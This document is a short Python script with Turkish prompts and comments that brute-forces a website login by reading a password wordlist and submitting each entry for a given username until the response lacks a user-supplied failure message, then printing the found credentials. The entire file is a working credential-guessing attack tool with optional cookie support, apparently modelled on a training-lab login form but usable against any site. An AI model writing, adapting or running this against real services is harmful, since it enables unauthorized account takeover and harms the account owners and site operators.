import requests
from termcolor import colored

url = input('[+] Sitenin linkini girin: ')
kullanici = input('[-] Hesabın kullanıcı adını girin: ')
sifre_dosyasi = input('[-] kullanmak istediğiniz şifre dosyasını seçin: ')
giris_basarisiz_sozcugu = input('[-] Giriş başarılı olmadığında çıkan cümleyi yazın: ')
cerez_adi = input('[-]Site sayfasında ki cookie değerini girin (Opsiyonel) \n cookie değeri almayı bilmiyorsan; \n https://www.cookieyes.com/how-to-check-cookies-on-your-website-manually/ : ')

def cozum(kullanici,url):
    for sifre in sifreler:
        sifre = sifre.strip()
        print('Trying: ' + sifre)
        veri = {'username':kullanici,'password':sifre,'Login':'submit'} #login ve submit sayfada bir değer olamaz o yüzden ve bu değerler siteden siteye değişebilir.
            
        if cerez_adi != '':
            geri_donus = requests.get(url, params={'username':kullanici,'password':sifre,'Login':'Login'},cookies ={'Cookie':cerez_adi}) # bu değerler siteden siteye göre değişebilir.
        else:
            geri_donus = requests.post(url, data=veri)

        if giris_basarisiz_sozcugu in geri_donus.content.decode():
            pass
        else:
            print(colored(('Kullanıcı bulundu !! ==> ' + kullanici), 'green'))
            print(colored(('Sifre Bulundu !!  ==> ' + sifre), 'green'))
            exit()



with open(sifre_dosyasi,'r') as sifreler:
    cozum(kullanici,url)

print(colored((' BAŞARAMADIN! ==> Sifre, bu liste dosyasında bulunamadı. '), 'red'))